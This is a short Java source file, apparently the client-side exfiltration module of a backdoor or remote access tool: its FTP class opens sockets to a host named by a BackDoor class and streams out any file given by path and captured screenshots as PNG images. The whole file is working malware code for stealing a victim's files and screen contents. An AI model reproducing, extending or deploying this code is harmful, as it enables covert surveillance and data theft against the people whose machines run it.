package client;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;

public class FTP {

    public static final int port = BackDoor.port + 1;

    /*
    private static Socket createConnectionSocket() throws IOException {
        Socket socket = new Socket(BackDoor.ip, FTP.port);
        return socket;
    }
     */

    public static void sendFile(String fileNameWithPath) throws IOException {
        Socket socket = new Socket(BackDoor.ip, FTP.port);
        OutputStream os = socket.getOutputStream();
        Files.copy(Paths.get(fileNameWithPath), os);
        os.flush();
        os.close();
    }

    public static void sendScreenshot(BufferedImage bufferedImage) throws IOException {
        Socket socket = new Socket(BackDoor.ip, FTP.port);
        OutputStream os = socket.getOutputStream();
        ImageIO.write(bufferedImage,"png", os);
        os.flush();
    }


}
